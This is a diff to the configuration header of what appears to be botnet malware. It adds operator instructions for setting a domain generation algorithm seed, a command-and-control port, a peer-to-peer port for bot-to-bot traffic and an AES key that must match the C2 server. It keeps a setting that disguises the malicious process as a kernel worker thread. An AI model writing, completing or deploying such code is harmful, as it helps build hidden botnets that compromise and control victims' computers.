@@ -1,20 +1,30 @@
 #ifndef CONFIG_H
 #define CONFIG_H
 
-// C2 & DGA Configuration
-#define DGA_SEED "a_very_secret_seed_string_123"
-#define C2_PORT 2323
+// ====================================================================
+// == C2 & COMMUNICATION CONFIGURATION - EDIT THESE VALUES ==
+// ====================================================================
 
-// P2P Configuration
-#define P2P_PORT 2324
+// The secret seed for the Domain Generation Algorithm (DGA).
+// This MUST match the seed on your C2 server.
+#define DGA_SEED "CHANGE_THIS_TO_YOUR_SECRET_DGA_SEED"
 
-// Encryption Configuration
-#define AES_KEY "a_256_bit_secret_key_for_aes_!@#"
+// The port your C2 server is listening on.
+#define C2_PORT 48101
 
-// Payload Configuration - Nombre corregido para que coincida con el código
-#define PAYLOAD_HOST "<YOUR_IP>"
+// The secret AES-256 encryption key.
+// This MUST be exactly 32 characters long and match the key on your C2 server.
+#define AES_KEY "YOUR_32_CHAR_SECRET_AES_KEY_HERE_"
 
-// ... rest of the config ...
+
+// ====================================================================
+// == OTHER CONFIGURATION ==
+// ====================================================================
+
+// P2P Configuration (for bot-to-bot communication, if enabled)
+#define P2P_PORT 48102
+
+// The name the process will be disguised as.
 #define HIDE_PROCESS_NAME "[kworker/u8:2]"
 
 #endif // CONFIG_H
